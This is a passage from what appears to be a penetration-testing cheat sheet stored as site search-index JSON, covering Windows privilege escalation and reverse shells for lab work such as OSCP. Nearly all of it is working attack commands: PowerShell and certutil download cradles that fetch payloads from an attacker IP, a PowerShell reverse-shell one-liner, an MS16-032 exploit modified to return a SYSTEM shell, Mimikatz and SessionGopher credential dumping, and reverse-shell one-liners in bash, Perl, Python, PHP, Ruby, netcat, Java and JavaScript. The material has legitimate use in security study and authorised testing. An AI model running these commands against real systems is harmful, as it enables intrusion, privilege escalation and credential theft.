-m SimpleHTTPServer 80 Or the Python pyftpdlib FTP Server (again don't run from TMUX): apt-get install python-pyftpdlib root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m pyftpdlib -p 21","title":"Uploading files to the Windows machine"},{"location":"privesc/#uploading-files-with-vbscript","text":"In my experiance, VBScript is one of the easiest methods of transfering files to a remote Windows. The only downside is that the file size you can transfer is rather limited. I often have trouble transfering anything over 1 MB using this method and have to fall back on other methods (Windows-privesc-check2.exe is much too large to transfer using this method). First lets test to see if we can run VBScript echo WScript.StdOut.WriteLine Yes we can run vbscript! testvb.vbs Now we run it to see the results: cscript testvb.vbs If you see the following message, we are good to go with VBScript!: C:\\Users\\Test cscript testvb.vbs Microsoft (R) Windows Script Host Version 5.812 Copyright (C) Microsoft Corporation. All rights reserved. Yes we can run vbscript! If you see the following messages, you should move on to PowerShell: C:\\temp cscript testvb.vbs This program is blocked by group policy. For more information, contact your system administrator. C:\\temp testvb.vbs Access is denied. Now we can create a very simple downloader script by copying and pasting this single line of code into your windows commandline. I have tried to create a VBS script to download files from a remote webserver with the least possible number of lines of VBS code and I believe this is it. If Windows is an older version of windows (Windows 8 or Server 2012 and below) use the following script: CMD C:\\ echo dim xHttp: Set xHttp = createobject( Microsoft.XMLHTTP ) dl.vbs echo dim bStrm: Set bStrm = createobject( Adodb.Stream ) dl.vbs echo xHttp.Open GET , WScript.Arguments(0), False dl.vbs echo xHttp.Send dl.vbs echo bStrm.type = 1 dl.vbs echo bStrm.open dl.vbs echo bStrm.write xHttp.responseBody dl.vbs echo bStrm.savetofile WScript.Arguments(1), 2 dl.vbs If Windows is a newer version (Windows 10 or Server 2016), try the following code: CMD C:\\ echo dim xHttp: Set xHttp = CreateObject( MSXML2.ServerXMLHTTP.6.0 ) dl.vbs echo dim bStrm: Set bStrm = createobject( Adodb.Stream ) dl.vbs echo xHttp.Open GET , WScript.Arguments(0), False dl.vbs echo xHttp.Send dl.vbs echo bStrm.type = 1 dl.vbs echo bStrm.open dl.vbs echo bStrm.write xHttp.responseBody dl.vbs echo bStrm.savetofile WScript.Arguments(1), 2 dl.vbs Now try to download a file to the local path: CMD C:\\ cscript dl.vbs http://10.10.10.10/archive.zip .\\archive.zip","title":"Uploading Files with VBScript"},{"location":"privesc/#uploading-files-with-certutilexe","text":"I've found that CertUtil can be quite reliable when all else seems to fail. certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe","title":"Uploading Files with CertUtil.exe"},{"location":"privesc/#transfering-files-using-mshta","text":"Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). And it can also be used to transfer files :D HTML: C:\\ mshta http://10.10.10.10/badthings.exe FTP: C:\\ mshta ftp://10.10.10.10:21/badthings.exe","title":"Transfering Files using MSHTA"},{"location":"privesc/#trasfering-files-using-bitsadmin","text":"Background Intelligent Transfer Service (BITS) is a component of Microsoft Windows XP and later iterations of the operating systems, which facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth. BITSAdmin is a command-line tool that you can use to create download or upload jobs and monitor their progress. For full, comprehensive documentation of the tool and all of its commands, see bitsadmin and bitsadmin examples in the Windows IT Pro Center. C:\\ bitsadmin /transfer badthings http://10.10.10.10:80/badthings.exe c:\\users\\public\\payload.exe","title":"Trasfering Files using Bitsadmin"},{"location":"privesc/#uploading-files-with-powershell","text":"Test to see if we can run Powershell: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command get-host Test to see if we can run Powershell Version 2: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command $PSVersionTable Try to download a file from a remote server to the windows temp folder from the Windows command line: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/exploit.exe\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\exploit.exe\\ ) Or from a PowerShell... shell: PS C:\\ IEX(New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/exploit.exe\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\exploit.exe\\ ) OR This one seems to work better while at the console: PS C:\\ IEX(New-Object System.Net.WebClient).DownloadFile( http://10.10.10.10/exploit.exe , C:\\Users\\Public\\Downloads\\exploit.exe )","title":"Uploading Files with PowerShell"},{"location":"privesc/#uploading-files-with-python","text":"Sometimes a Windows machine will have development tools like Python installed. Check for python python -h Download a file using Python: python -c import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/cat.jpg', 'C:\\\\Users\\\\Public\\\\Downloads\\\\cat.jpg');","title":"Uploading Files with Python"},{"location":"privesc/#uploading-files-with-perl","text":"Sometimes a Windows machine will have development tools like PERL installed. Check for PERL perl -v Download a file using PERL: perl -le use File::Fetch; my $ff = File::Fetch- new(uri = 'http://10.10.10.10/nc.exe'); my $file = $ff- fetch() or die $ff- error;","title":"Uploading Files with Perl"},{"location":"privesc/#uploading-files-with-ftp","text":"After running the python ftp lib on ( python -m pyftpdlib -p 21 ) on Kali, you can try connecting using the windows FTP client: C:\\Users\\pwnd ftp 10.10.10.10 Connected to 10.10.10.10 220 pyftpdlib 1.5.3 ready. User (10.10.15.31:(none)): anonymous 331 Username ok, send password. Password: anonymous 230 Login successful. ftp ls dir 421 Active data channel timed out. If you are seeing a 421 timeout when you try to send a command it is likely because your connection is being blocked by the windows firewall. The Windows command-line ftp.exe supports the FTP active mode only. In the active mode, the server has to connect back to the client to establish data connection for a file transfer. You can check to see if the remote machine has Winscp.exe installed. Winscp is capable of connecting to an FTP server using passive mode and will not be blocked by the firewall.","title":"Uploading Files with FTP"},{"location":"privesc/#transfering-files-via-smb-using-impacket","text":"Kali comes loade with the incredible Impacket library which is a swiss army knife of network protocols... just Awesome. You can easily create a SMB share on your local Kali machine and move files between Kali and Windows with ease. https://github.com/SecureAuthCorp/impacket First we will setup the SMB Share on Kali like so: root@kali:~# impacket-smbserver root /root/Desktop Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed Confirm it is up and running using Net View on the Windows command line: C:\\Users\\Null net view \\\\192.168.0.49 Shared resources at \\\\192.168.0.49 (null) Share name Type Used as Comment ------------------------------------------------------------------------------- smbshare Disk The command completed successfully. Then we can trasnfer files from the command line as if it were a normal folder: C:\\Users\\Admin dir \\\\192.168.0.49\\smbshare C:\\Users\\Admin copy \\\\192.168.0.49\\smbshare\\loot.zip . By far the most interesting feature of the SMB Share method is that you can execute files directly over the SMB Share without copying them to the remote machine (fileless execution is so hot right now): C:\\Users\\Admin \\\\192.168.0.49\\smbshare\\payload.exe A fancy trick I learned from IPPSec is to create a mapped drive to a remote SMB share like so: net use y: \\\\192.168.0.49\\smbshare y: dir","title":"Transfering Files via SMB using Impacket"},{"location":"privesc/#execute-a-remote-shell-dropper","text":"Often, you can leverage PowerShell to execute a remotely hosted powershell script which contains a shell dropper (generated by the platform of your choosing). CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NonInteractive -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')) There are also some no-so-well documented PowerShell argument shortcuts so can use things like -w rather than -WindowsStyle (handy for smaller payloads): CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -noni -nop -i None -ex Bypass -c iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))","title":"Execute a remote shell dropper"},{"location":"privesc/#upgrading-your-windows-shell","text":"You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:","title":"Upgrading your Windows Shell"},{"location":"privesc/#upgrade-shell-with-powershell-nishang","text":"Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetraion Tests. The scripts are written on the basis of requirement by the author during real Penetration Tests. root@kali:~/test# git clone https://github.com/samratashok/nishang.git Cloning into 'nishang'... remote: Enumerating objects: 1612, done. remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612 Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done. Resolving deltas: 100% (1010/1010), done. root@kali:~/test# cd nishang/ root@kali:~/test/nishang# cd Shells/ root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 Invoke-PowerShellTcp.ps1 root@kali:~/test/nishang/Shells# python -m SimpleHTTPServer 80 Now open up a netcat listener on Kali: nc -nlvp 4444 And Execute the remote powershell script hosted on your Kali SimpleHTTPServer CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))","title":"Upgrade Shell with PowerShell Nishang"},{"location":"privesc/#upgrade-windows-command-line-with-a-powershell-one-liner-reverse-shell","text":"You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port): CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command {$client = New-Object System.Net.Sockets.TCPClient(\\ 10.10.10.10\\ ,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + \\ PS \\ + (pwd).Path + \\ ^ \\ ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}","title":"Upgrade Windows Command Line with a Powershell One-liner Reverse Shell:"},{"location":"privesc/#netcat-reverseshell-oneliners-for-windows","text":"Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell.","title":"Netcat Reverseshell Oneliners for Windows"},{"location":"privesc/#windows-enumeration","text":"NOTE There are many executables that could provide privledge escalation if they are being run by a privledged user, most can be found on the incredible LOLBAS project: https://lolbas-project.github.io/","title":"Windows Enumeration"},{"location":"privesc/#automated-windows-enumeration-scripts","text":"We are also going to look a a few automated methods of performing Windows Enumeration including: * WindownPrivEsc.exe * Sherlock * Watson * JAWZ * Seatbelt","title":"Automated Windows Enumeration Scripts"},{"location":"privesc/#running-windows-privesc-check-windows-privesc-check","text":"The Windows Privesc Check is a very powerful tool for finding common misconfigurations in a Windows system that could lead to privledge escalation. It has not been updated for a while, but it is still as effective today as it was 5 years ago. The downside of this script is that it was written in Python and if the target system does not have Python installed, you will need to use an executable version that has a Python interpreter built in. Having to include Python in the package makes the executable version is pretty large, coming in at a whopping 7.14 MB!! First we will need to clone the latest version to our environment: root@kali:~/tools# git clone https://github.com/pentestmonkey/windows-privesc-check Cloning into 'windows-privesc-check'... remote: Enumerating objects: 1232, done. remote: Total 1232 (delta 0), reused 0 (delta 0), pack-reused 1232 Receiving objects: 100% (1232/1232), 34.79 MiB | 4.61 MiB/s, done. Resolving deltas: 100% (897/897), done. Next we will need to setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from: root@kali:~/tools# cd windows-privesc-check/ root@kali:~/tools/windows-privesc-check# python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Now we will need to transfer the file to our remote windows box: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/windows-privesc-check2.exe\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\windows-privesc-check2.exe\\ ); And now we run the executeable on the remote machine. I like run with all the audit enabled like so: C:\\Users\\Admin cd .. C:\\Users cd Public C:\\Users\\Public cd Downloads C:\\Users\\Public\\Downloads windows-privesc-check2.exe --audit -a -o report windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)... The windows-privesc-check will create a detailed HTML report and text based report for your review.","title":"Running Windows Privesc Check (windows-privesc-check)"},{"location":"privesc/#running-sherlock","text":"Sherlock is a powershell library with a number of privledge escalation checkers built in. We can stage and run sherlock on a remote http server so the file never needs to hit the remote server's HDD. root@kali:~test# git clone https://github.com/rasta-mouse/Sherlock.git Cloning into 'Sherlock'... remote: Enumerating objects: 3, done. remote: Counting objects: 100% (3/3), done. remote: Compressing objects: 100% (3/3), done. remote: Total 75 (delta 0), reused 2 (delta 0), pack-reused 72 Unpacking objects: 100% (75/75), done. root@kali:~test# cd Sherlock/ root@kali:~test/Sherlock# ls LICENSE README.md Sherlock.ps1 root@kali:~test/Sherlock# echo Find-AllVulns Sherlock.ps1 root@kali:~test/Sherlock# python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Now we can run this from the remote Windows CMD shell: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1')) Or from a Windows Powershell: PS C:\\ IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')","title":"Running Sherlock"},{"location":"privesc/#running-watson","text":"Sherlock has been superceded by a .net Windows enumeration platform called Watson which is frequently updated by the author. It is a bit tricker to deploy and use as you need to compile it yourself and match the version of .net with the target system's version. First, on the target system we will need to check the versions of .Net that have been installed by navigating to the .net framework folder and poking around: cd\\Windows\\Microsoft.NET\\Framework\\ dir /s msbuild Only active versions of .NET will have the msbuild.exe. Make note of the available versions and leverage that to compile your version of Watson that targets the remote Windows machine. Download the latest version of Watson from github: git clone https://github.com/rasta-mouse/Watson.git And open it using Visual Studio. In the Solution Explorer, click the Properties and modify the \"Target Framework:\" value to align with the remote Windows machine's version of the .Net framework. It will prompt you to reopen the project. Once the project has reloaded, Build the project under the Release mode (CTRL + SHIFT + B). Next we will copy our Watson.exe to our Kali instance and setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from: root@kali:~/tools# cd Watson/ root@kali:~/tools/Watson# python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Now we will need to transfer the compiled Watson.exe file to our remote windows box: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/Watson.exe\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\Watson.exe\\ ); And now we run the executeable on the remote machine. I like run with all the audit enabled like so: C:\\Users\\Admin cd .. C:\\Users cd Public C:\\Users\\Public cd Downloads C:\\Users\\Public\\Downloads Watson.exe","title":"Running Watson"},{"location":"privesc/#running-jaws-just-another-windows-enum-script","text":"JAWS is another powershell library that was built with privledge escalation of the OSCP lab machines in mind. We can stage and run JAWS on a remote http server so the file never needs to hit the remote server's HDD. root@kali:~test# git clone https://github.com/411Hall/JAWS Now we can run this from the remote Windows CMD shell: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/jaws-enum.ps1')) Or from a Windows Powershell: PS C:\\ IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/jaws-enum.ps1') And we should see the following output start to appear: Running J.A.W.S. Enumeration - Gathering User Information - Gathering Processes, Services and Scheduled Tasks - Gathering Installed Software","title":"Running JAWS - Just Another Windows (Enum) Script"},{"location":"privesc/#fireeye-session-gopher","text":"Leveraging credentials is still the most common ways of privledge escalation in Windows environments. Session Gopher is a PowerShell script designed to automaticlly harvest credentials from commonly used applications. To run Session Gopher, we will first need to pull down the latest version from the Fireeye github repository: git clone https://github.com/fireeye/SessionGopher Cloning into 'SessionGopher'... remote: Enumerating objects: 48, done. Unpacking objects: 100% (48/48), done. remote: Total 48 (delta 0), reused 0 (delta 0), pack-reused 48 Next we can serve it up on our local KALI instance by using the simple python HTTP server: root@kali:~/tools# cd SessionGopher/ root@kali:~/tools/SessionGopher# ls README.md SessionGopher.ps1 root@kali:~/tools/SessionGopher# python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... Finally we can file-lessly execute it from our remote Windows shell: @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/SessionGopher.ps1')); Invoke-SessionGopher -Thorough Or from a Windows Powershell: PS C:\\ IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/SessionGopher.ps1') Or we can download and run it: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/SessionGopher.ps1\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\SessionGopher.ps1\\ ); CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command { . .\\SessionGopher.ps1; Invoke-SessionGopher -Thorough}","title":"Fireeye Session Gopher"},{"location":"privesc/#running-mimikatz","text":"Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM/NTDS.dit databases, advanced Kerberos functionality, and more. https://github.com/gentilkiwi/mimikatz","title":"Running Mimikatz"},{"location":"privesc/#running-traditional-binary-mimikatz","text":"The original and most frequently updated version of Mimikatz is the binary executable which can be found here: https://github.com/gentilkiwi/mimikatz/releases First we will need to download a Mimikatz binary and copy it to the remote machine root@kali:~/test# wget https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip --2018-10-16 15:14:49-- https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip root@kali:~/test# unzip mimikatz_trunk.zip Now we will need to copy the 3 files (win32 or x64 depending on the OS) required to run Mimikatz to the remote server. CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/mimidrv.sys\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\mimidrv.sys\\ ); (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/mimikatz.exe\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\mimikatz.exe\\ ); (New-Object System.Net.WebClient).DownloadFile(\\ http://10.10.10.10/mimilib.dll\\ , \\ C:\\\\Users\\\\Public\\\\Downloads\\\\mimilib.dll\\ ) Now, if we dont have an overly interactive shell, we will want to execute Mimikatz without the built in CLI by passing the correct parameters to the executable. We use the log parameter to also log the clear password results to a file (just in case we are unable to see the output). mimikatz log version sekurlsa::logonpasswords exit Otherwise we can use the Mimikatz shell to get the passwords: mimikatz.exe mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::logonpasswords","title":"Running traditional (binary) Mimikatz"},{"location":"privesc/#running-powershell-mimikatz","text":"The Powershell version is not as frequently updated, but can be loaded into memory without ever hitting the HDD (Fileless execution). This version simply reflectively loads the Mimikatz binary into memory so we could probably update it ourselves without much difficulty. wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 Fileless execution of Mimikatz from remotely hosted server: PS C:\\ IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds","title":"Running Powershell Mimikatz"},{"location":"privesc/#windows-kernel-exploits","text":"","title":"Windows Kernel Exploits"},{"location":"privesc/#ms16-032","text":"If the remote machine appears to be vulnerable to MS16-032, we can execute a powershell script from a remote server to exploit it. Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Appears Vulnerable Get the Powershell script from FuzzySecurity's Github, add an invoke to the end of the script and share the folder using the python SimpleHTTPServer: root@kali:~test# git clone https://github.com/FuzzySecurity/PowerShell-Suite.git Cloning into 'PowerShell-Suite'... remote: Enumerating objects: 378, done. remote: Total 378 (delta 0), reused 0 (delta 0), pack-reused 378 Receiving objects: 100% (378/378), 5.94 MiB | 2.06 MiB/s, done. Resolving deltas: 100% (179/179), done. root@kali:~test# cd PowerShell-Suite/ root@kali:~test/PowerShell-Suite# echo Invoke-MS16-032 Invoke-MS16-032.ps1 root@kali:~test/PowerShell-Suite# python -m Simple SimpleDialog SimpleHTTPServer SimpleXMLRPCServer root@kali:~test/PowerShell-Suite# python -m SimpleHTTPServer 80 The default version of the MS16-032 script will create a Pop-up CMD.exe window on the remote machine. Unfortunatly, we cannot access this from a limited shell... BUT we can modify the exploit to call a reverse shell. Its pretty easy to modify it to call a reverse powershell that will connect back to our machine with a System shell. We will need to modify line 330 of the exploit (the ip address and port will need to be updated of course): # LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED #$CallResult = [Advapi32]::CreateProcessWithLogonW( # user , domain , pass , # 0x00000002, C:\\Windows\\System32\\cmd.exe , , # 0x00000004, $null, $GetCurrentPath, # [ref]$StartupInfo, [ref]$ProcessInfo) # Modified to create a Powershell reverse shell $CallResult = [Advapi32]::CreateProcessWithLogonW( user , domain , pass , 0x00000002, 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command {$client = New-Object System.Net.Sockets.TCPClient(\\ 10.10.10.10\\ ,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + \\ PS \\ + (pwd).Path + \\ ^ \\ ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} ', 0x00000004, $null, $GetCurrentPath, [ref]$StartupInfo, [ref]$ProcessInfo) On the remote host execute the exploit: CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16-032.ps1')) Or from a Windows Powershell: PS C:\\ IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-MS16-032.ps1') Or if you wanted to upload the exploit, you can always run it like this: PS C:\\ powershell -ExecutionPolicy ByPass -command { . C:\\Users\\Public\\Invoke-MS16-032.ps1; Invoke-MS16-032 } On our Kali machine we create the reverse shell and ... BOOM! Root dance. root@kali:~# nc -nlvp 4444 listening on [any] 4444 ... connect to [10.10.10.11] from (UNKNOWN) [10.10.10.10] 49182 PS C:\\Users\\jimmy^ whoami nt authority\\system","title":"MS16-032"},{"location":"privesc/#windows-run-as","text":"Prior to successfully performing a Windows run as, we of course need a valid windows username and password. Here is a oneliner powershell script to verify a username / password is valid on the local system: Requires .Net 3.5 CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command {$username = ' username here '; $password = ' password here '; $computer = $env:COMPUTERNAME; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$computer); $obj.ValidateCredentials($username, $password); } Requires .Net 2.0 CMD C:\\ @ %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command {$username = ' username here '; $password = ' password here '; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\\Windows\\System32\\calc.exe -NoNewWindow -Credential $credential; } Switching users in linux is trival with the SU command. However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows. Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system). C:\\ psexec64 \\\\COMPUTERNAME -u Test -p test -h c:\\users\\public\\nc.exe -nc 192.168.1.10 4444 -e cmd.exe PsExec v2.2 - Execute processes remotely Copyright (C) 2001-2016 Mark Russinovich Sysinternals - www.sysinternals.com ``` Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe: ```cmd C:\\ C:\\Windows\\System32\\runas.exe /env /noprofile /user:Test c:\\users\\public\\nc.exe -nc 192.168.1.10 4444 -e cmd.exe Enter the password for Test: Attempting to start nc.exe as user COMPUTERNAME\\Test ... PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password. $username = ' username here ' $password = ' password here ' $securePassword = ConvertTo-SecureString $password -AsPlainText -Force $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword Start-Process -FilePath C:\\Users\\Public\\nc.exe -NoNewWindow -Credential $credential -ArgumentList ( -nc , 192.168.1.10 , 4444 , -e , cmd.exe ) -WorkingDirectory C:\\Users\\Public Next run this script using powershell.exe: CMD C:\\ powershell -ExecutionPolicy ByPass -command { . C:\\Users\\public\\PowerShellRunAs.ps1; }","title":"Windows Run As"},{"location":"privesc/#other-files","text":"Here are few other handy scripts and things... CopyAndPasteFileDownloader.bat Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line) CopyAndPasteEnum.bat No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial). Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report enumeration.md Basic notes on Windows Enumeration from the OSCP. windows_recon.bat An uploadable batch file for performing basic windows enumeration. References https://medium.com/@hakluke https://daya.blog/2018/01/06/windows-privilege-escalation/ https://pentestlab.blog/2017/04/19/stored-credentials/ https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/ https://www.abatchy.com/ https://gist.github.com/egre55 https://github.com/egre55/ultimate-file-transfer-list https://lolbas-project.github.io/ https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ https://github.com/GhostPack/Seatbelt https://github.com/rasta-mouse/Watson http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://blog.ropnop.com/transferring-files-from-kali-to-windows/#smb Source: https://github.com/frizb/Windows-Privilege-Escalation Updated 22 July 2019","title":"Other files"},{"location":"shells/","text":"Find out which programs are installed for item in $(echo nmap nc perl python ruby gcc wget sudo curl ); do which $item; done` Bash bash -i /dev/tcp/10.0.0.1/8080 0 1 Perl perl -e 'use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );};' Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);' PHP My favorite web shell: p0wny-shell php -r '$sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 );' For those situations when a PHP command injection shell spawns and immediately dies, this will run in the background: function execInBackground($cmd) { if (substr(php_uname(), 0, 7) == Windows ){ pclose(popen( start /B . $cmd, r )); } else { exec($cmd . /dev/null ); } } execInBackground( /bin/bash -c 'bash -i /dev/tcp/192.168.1.221/8081 0 1' ); Ruby ruby -rsocket -e'f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f)' Netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.0.0.1 1234 /tmp/f Java r = Runtime.getRuntime() p = r.exec([ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String[]) p.waitFor() JavaScript var spawn = require('child_process').spawn; var net = require('net'); var reconnect = require('reconnect'); reconnect(function (stream) { var ps = spawn('bash', [ '-i' ]); stream.pipe(ps.stdin); ps.stdout.pipe(stream, { end: false }); ps.stderr.pipe(stream, { end: false }); ps.on('exit', function () { stream.end() }); }).connect(5500, '192.168.60.124'); 